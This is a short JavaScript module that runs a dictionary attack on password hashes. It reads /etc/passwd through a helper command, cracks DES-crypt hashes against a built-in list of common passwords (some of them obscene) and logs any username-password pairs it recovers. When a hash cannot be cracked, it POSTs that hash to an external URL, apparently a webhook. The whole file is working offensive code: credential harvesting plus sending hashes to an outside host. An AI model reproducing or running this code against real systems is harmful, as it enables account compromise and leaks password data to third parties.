import crypt from "../modules/crypt.js";
import * as terminal from "../utils/terminal.js";
import * as keyboard from "../utils/keyboard.js";

const wordlist = [
  "access",
  "password",
  "abc123",
  "master",
  "superman",
  "joshua",
  "mustang",
  "changeme",
  "iloveyou",
  "fuckyou",
  "iwantu",
  "sex",
  "shadow",
  "god",
  "monkey",
  "test",
  "batman",
  "baseball",
  "trustno1",
  "qwerty",
  "dragon",
  "love",
  "football",
  "letmein",
  "babygirl",
  "starwars",
  "secret",
  "princess",
  "sexy",
  "123456",
  "fuck",
  "hunter2",
];

export async function crackHash(hash) {
  const salt = hash.slice(0, 2);
  for (const word of wordlist) {
    const candidate = crypt(word, salt);
    if (candidate === hash) {
      return word;
    }
  }
  return null;
}

export async function crackCurrentHost() {
  const lines = await keyboard.th_exec("cat /etc/passwd");

  for (const line of lines) {
    const match = line.match(/^([^:]+):([.0-9A-Za-z]+):/);

    if (match) {
      const username = match[1];
      let hash = match[2];
      hash = hash.slice(0, 13);
      console.log(`Cracking password for user ${username} with hash ${hash}`);
      const password = await crackHash(hash);
      if (password) {
        console.log(`Cracked! User: ${username} Password: ${password}`);
        return {
          username: username,
          password: password,
        };
      } else {
        console.log(`Failed to crack hash for user ${username}: ${hash}`);
        await fetch(window.url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: "# WARNING HASH NOT CRACKED: `" + hash + "`",
          }),
        });
        return {
          username: username,
          password: null,
        };
      }
    }
  }
}
